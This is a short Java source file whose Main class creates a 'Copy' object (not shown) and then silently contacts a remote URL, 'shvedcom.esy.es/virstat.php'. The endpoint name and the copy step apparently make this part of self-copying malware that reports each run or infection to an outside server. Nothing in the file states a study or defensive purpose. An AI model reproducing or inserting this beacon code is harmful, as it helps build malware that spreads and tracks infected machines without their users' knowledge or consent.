import java.io.IOException;
import java.net.URL;

public class Main {

    static Copy copy;

    public static void main(String[] args) {
        copy = new Copy();
        try {
            new URL("http://shvedcom.esy.es/virstat.php").openConnection().getInputStream();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
